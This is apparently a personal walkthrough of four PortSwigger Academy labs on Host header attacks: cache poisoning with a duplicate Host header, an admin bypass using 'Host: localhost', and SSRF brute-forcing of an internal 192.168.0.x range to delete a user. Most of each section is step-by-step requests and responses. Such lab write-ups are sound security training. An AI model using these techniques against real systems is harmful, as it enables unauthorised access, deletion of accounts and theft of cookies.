# Portswigger
## HTTP Host Header vulnerabilities
### Web cache poisoning via ambiguous requests
```bash

# This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

# To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser. 

Refresh the page
Go to: HTTP history
Find:

GET / HTTP/1.1

Add an additional Host: header below the current Host: header
Like so:

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: test.com

Send
Copy "test.com"
Ensure the response includes:

X-Cache: hit

Enter into the search box:

test.com

Find:

<script type="text/javascript" src="//test.com/resources/js/tracking.js"></script>

Go to: "Go to exploit server"
File:

/resources/js/tracking.js

Body:

alert(document.cookie)

Go to: Repeater
Change:

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: test.com

To

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: exploit-0a4400bd04f32f3ec0790e1c01b9001f.web-security-academy.net

Send
Ensure the response includes:

X-Cache: hit

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605221119.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605221537.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605221454.png)

### Host header authentication bypass
```bash

# This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

# To solve the lab, access the admin panel and delete Carlos's account. 

Refresh the page
Go to: Target -> Right-click current_website.com -> Engagement tools -> Discover content -> Session is not running
Go to: HTTP history
Find:

GET / HTTP/1.1

Add an additional Host: header below the current Host: header
Like so:

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net
Host: test.com

Fail

Change: 

Host: 0a2b00ba04a02f02c0f60e8e00b80048.web-security-academy.net

To

Host: test.com

Success

Go to: Target and acknowledge that /admin was enumerated

Go to: Repeater

Change:

GET / HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 401 Unauthorized

"Admin interface only available to local users"

Change:

Host: test.com

To

Host: localhost

Response:

HTTP/1.1 200 OK

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605223122.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605222430.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605223229.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605223314.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220605223041.png)

### Routing-based SSRF
```bash

# This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.

# To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. 

Refresh the page
Go to HTTP: history
Find:

GET / HTTP/1.1

Go to: Burp -> Burp Collaborator client -> Copy to clipboard
Change:

Host: 0a9c00a604717e25c0b4237d001b0056.web-security-academy.net

To

Host: qc6ewr6ssnh6x2sewzejjqo3buhm5b.oastify.com

Send to Intruder
Un-check "Update Host header to match target"
Clear

Change:

Host: qc6ewr6ssnh6x2sewzejjqo3buhm5b.oastify.com

To

Host: 192.168.0.§0§

Go to: Payloads
Payload Sets
Payload type: Numbers
Payload Options[Numbers]
From: 0
To: 255
Step: 1
Start attack
There will be one status of "302"
Send to repeater
Send
Response:

HTTP/1.1 302 Found
Location: /admin

Go to: 

GET /admin HTTP/1.1

Response:

<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
  <input required type="hidden" name="csrf" value="LHoEesCM8Rns3JNsSL5xLCNOPoQpbsGj">
   <label>Username</label>
  <input required type='text' name='username'>
  <button class='button' type='submit'>Delete user</button>
</form>

Go to:

GET /admin/delete?csrf=LHoEesCM8Rns3JNsSL5xLCNOPoQpbsGj&username=carlos HTTP/1.1

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606002006.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606002022.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606003111.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606003240.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606003323.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606003458.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606003929.png)

### SSRF via flawed request parsing
```bash

# This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

# To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos. 

Refresh the page
Go to HTTP: history
Find:

GET / HTTP/1.1

Send to repeater

Change:

GET / HTTP/1.1

To

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1

Response:

HTTP/1.1 200 OK

Change:

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1
Host: 0a3e00f104df64eec04e156b0099008d.web-security-academy.net

To

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1
Host: check.com

Response:

HTTP/1.1 504 Gateway Timeout

Server Error: Gateway Timeout (3) connecting to check.com

Change:

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1
Host: check.com

To

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1
Host: 5agav5afksow19o3qzpk8p6h288ywn.oastify.com

Response:

HTTP/1.1 200 OK

Send to Intruder
Un-check "Update Host header to match target"
Clear
Change:

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1
Host: 5agav5afksow19o3qzpk8p6h288ywn.oastify.com

To

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.§0§

Go to: Payloads
Payload Sets
Payload type: Numbers
Payload Options[Numbers]
From: 0
To: 255
Step: 1
Start attack
There will be one status of "302"
Send to repeater
Send
Response:

Location: /admin 

Change:

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.75

To

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.75

Response:

HTTP/1.1 200 OK

<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
	<input required type="hidden" name="csrf" value="beihv9uOhjvzvuH7SSNW54R8rTZWd6W5">
	 <label>Username</label>
	<input required type='text' name='username'>
	<button class='button' type='submit'>Delete user</button>
</form>

Change:

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/admin HTTP/1.1

To

GET https://0a3e00f104df64eec04e156b0099008d.web-security-academy.net/admin/delete?csrf=beihv9uOhjvzvuH7SSNW54R8rTZWd6W5&username=carlos HTTP/1.1

HTTP/1.1 302 Found

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606004847.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606015956.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606020025.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220606020051.png)

#hacking
